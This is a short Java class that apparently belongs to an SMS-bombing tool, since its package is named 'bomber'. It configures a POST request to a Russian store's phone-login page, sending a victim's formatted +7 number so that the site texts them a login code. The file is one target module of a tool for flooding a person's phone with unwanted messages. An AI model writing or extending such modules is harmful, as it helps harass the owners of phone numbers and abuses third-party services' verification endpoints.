package com.dm.bomber.services;

import okhttp3.FormBody;

public class Stroyudacha extends FormService {

    public Stroyudacha() {
        setUrl("https://stroyudacha.ru/site/phone_login.html");
        setMethod(POST);
        setPhoneCode("7");
    }

    @Override
    public void buildBody(FormBody.Builder builder) {
        builder.add("phone", format(phone, "+7 (***) ***-**-**"));
        builder.add("phone_code", "");
    }
}
